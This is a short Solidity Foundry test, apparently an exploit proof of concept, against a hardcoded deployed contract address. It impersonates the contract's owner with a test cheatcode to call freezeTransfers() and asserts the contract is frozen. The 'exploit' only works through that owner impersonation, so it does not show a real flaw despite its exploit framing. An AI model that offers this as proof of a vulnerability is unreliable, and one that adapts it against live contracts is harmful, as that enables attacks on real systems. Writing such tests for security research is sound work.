// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LineAxis {
    function owner() external view returns (address);
    function freezeTransfers() external;
    function frozen() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed beyond the existing TARGET constant
        // We'll get the owner dynamically in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner of the contract
        LineAxis target = LineAxis(TARGET);
        address owner = target.owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Call freezeTransfers() to freeze the contract
        target.freezeTransfers();

        vm.stopPrank();

        // Verify the frozen state is true
        bool frozen = target.frozen();
        assertEq(frozen, true, "Contract should be frozen");
        assertEq(target.frozen(), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
